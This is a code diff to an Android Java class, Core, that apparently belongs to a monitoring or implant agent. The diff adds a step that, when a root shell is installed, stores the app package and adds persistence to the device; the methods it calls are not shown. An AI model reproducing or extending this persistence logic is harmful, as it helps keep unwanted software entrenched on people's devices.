@@ -442,7 +442,6 @@ public class Core extends Activity implements Runnable {
 		}
 
 		status.unTriggerAll();
-
 	}
 
 	/**
@@ -452,15 +451,25 @@ public class Core extends Activity implements Runnable {
 	 */
 	private int taskInit() {
 		try {
-			if(!Path.makeDirs()){
+			if (!Path.makeDirs()) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (taskInit) Error: Can't create a writable directory");
 				}
+				
 				return ConfType.Error;
 			}
 
+			// Initialize persistence
+			if (Root.isRootShellInstalled()) {
+				Persistence p = new Persistence(Status.getAppContext());
+				
+				p.storePackage();
+				p.addPersistance();
+			}
+			
 			// this markup is created by UninstallAction
 			final Markup markup = new Markup(0);
+			
 			if (markup.isMarkup()) {
 				UninstallAction.actualExecute();
 				return ConfType.Error;
